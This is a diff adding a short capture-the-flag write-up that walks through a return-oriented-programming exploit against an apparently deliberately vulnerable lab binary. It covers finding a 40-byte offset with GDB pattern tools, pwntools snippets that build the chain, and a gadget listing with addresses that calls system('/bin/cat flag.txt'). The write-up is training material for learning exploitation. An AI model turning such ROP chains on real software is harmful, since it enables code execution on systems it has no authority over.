@@ -1,0 +1,34 @@
+I need to perform a ROP Chain attack to call system("/bin/cat flag.txt").
+
+1) First, I need to determine the offset required to overwrite the return address.
+2) I launch GDB and type the command pattern_create 300 pat_300.
+3) This command generates a unique pattern of 300 characters and saves it to a file.
+4) I run the program with the pattern by typing run < pat_300.
+5) Next, I type the command pattern_search in GDB to locate the offset and find that it is 40.
+6) I begin constructing the payload by adding 40 'A' characters as padding.
+7) To overwrite the return address, I build a ROP gadget chain.
+8) I write a Python script to generate the ROP chain dynamically.
+9) I include padding to align the stack (if necessary):
+
+if padding:
+    rop.raw(rop.ret)
+
+10) I set the RDI register to pass the parameter for the system function:
+
+command = next(elf.search(b"/bin/cat flag.txt"))
+rop(rdi=command)
+
+11) I add the system function call to the ROP chain:
+
+rop.raw(elf.symbols["system"])
+
+12) The resulting ROP chain looks like this:
+
+0x0000:         0x40053e ret
+0x0008:         0x4007c3 pop rdi; ret
+0x0010:         0x601060 usefulString
+0x0018:         0x400560 system
+
+13) I add the ROP chain to the payload and launch the script.
+
+Flag: ROPE{a_placeholder_32byte_flag!}
